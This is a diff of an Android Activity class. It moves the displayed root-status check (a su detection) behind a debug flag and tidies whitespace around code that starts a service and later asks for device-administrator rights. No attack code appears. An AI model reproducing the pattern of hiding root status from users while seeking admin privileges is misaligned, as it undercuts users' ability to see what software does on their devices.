@@ -101,10 +101,12 @@ public class AGUI extends Activity {
 		if (Build.DISPLAY.length() > 0)
 			t.append("Display: " + Build.DISPLAY + "\n");
 
-		if (PackageInfo.hasSu()) {
-			t.append("Root: yes");
-		} else {
-			t.append("Root: no");
+		if (Cfg.DEBUG) {
+			if (PackageInfo.hasSu()) {
+				t.append("Root: yes");
+			} else {
+				t.append("Root: no");
+			}
 		}
 	}
 
@@ -129,9 +131,9 @@ public class AGUI extends Activity {
 				this.handler = new Handler();
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Starting cn: "+ service);//$NON-NLS-1$
+					Check.log(TAG + " Starting cn: " + service);//$NON-NLS-1$
 				}
-				
+
 				final ComponentName cn = startService(new Intent(service));
 
 				if (cn == null) {
@@ -190,7 +192,7 @@ public class AGUI extends Activity {
 		if (Root.shouldAskForAdmin() == false) {
 			return;
 		}
-		
+
 		handler.postDelayed(new Runnable() {
 
 			@Override
